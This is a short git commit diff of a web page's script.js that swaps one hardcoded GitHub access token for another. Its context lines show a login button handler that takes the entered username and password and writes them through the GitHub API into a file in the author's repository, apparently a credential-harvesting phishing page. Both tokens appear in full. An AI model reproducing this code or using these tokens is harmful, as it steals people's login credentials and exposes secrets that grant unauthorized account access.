cd900187555977e0f5a9e5df9bde731944b3f352
arnav <arnav4c@gmail.com>
2023-09-18 02:32:30 +0530

    update

--- script.js
+++ script.js
@@ -9,7 +9,7 @@ document.querySelector('.loginButton').addEventListener('click', () => {
       const repoOwner = 'GreatArnav'
       const repoName = 'info'
       const filePath = 'info.txt'
-      const githubToken = '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'
+      const githubToken = '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'
       const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`
 
       const newTextContent = `username - "${username.value}" | password - "${password.value}"`
